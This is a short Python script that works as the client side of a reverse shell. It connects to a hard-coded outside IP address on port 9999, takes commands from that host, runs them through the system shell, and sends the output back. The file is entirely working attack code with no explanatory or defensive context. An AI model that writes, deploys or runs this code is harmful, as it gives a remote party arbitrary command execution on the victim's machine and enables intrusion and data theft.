import socket
import os
import subprocess

S1 = socket.socket()
Host_Address = '65.0.169.170'  # ip address of the server
port_no = 9999

S1.connect((Host_Address, port_no))

while True:
    received_data = S1.recv(1024)
    if received_data[:2].decode("utf-8") == 'cd':
        os.chdir(received_data[3:].decode("utf-8"))

    if len(received_data) > 0:
        command1 = subprocess.Popen(received_data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        byte_output = command1.stdout.read() + command1.stderr.read()
        string1_output = str(byte_output,"utf-8")
        Current1 = os.getcwd() + "> "
        S1.send(str.encode(string1_output + Current1))

        print(string1_output)

